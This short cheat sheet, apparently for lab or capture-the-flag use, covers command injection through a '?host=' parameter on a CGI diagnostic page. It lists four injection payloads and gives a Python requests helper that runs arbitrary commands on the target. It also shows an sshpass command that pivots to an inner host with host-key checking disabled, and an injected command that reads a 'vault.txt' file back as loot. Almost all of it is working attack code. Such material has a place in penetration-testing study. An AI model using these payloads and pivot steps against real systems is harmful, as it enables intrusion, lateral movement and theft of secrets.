# Cheatsheet — command injection & scripted pivot

## Injection primitives for `?host=`

- `127.0.0.1;id` — command separator
- `127.0.0.1$(id)` — command substitution
- `` 127.0.0.1`id` `` — backticks
- `127.0.0.1|id` — pipe the ping away

## Via requests (params does the encoding)

```python
import requests
def inj(cmd):
    return requests.get("http://web01/cgi-bin/diag",
                        params={"host": f"127.0.0.1;{cmd}"}).text
```

## Running ssh *from* the injected host

```bash
sshpass -p 'pass-with-special-chars' \
  ssh -o StrictHostKeyChecking=no user@inner 'remote cmd'
```

Single quotes matter — the inner command travels through two shell layers.

## Reading loot back through the injection

```python
out = inj("sshpass -p 'P' ssh -o StrictHostKeyChecking=no u@inner "
          "'cat ~/vault.txt'")
```
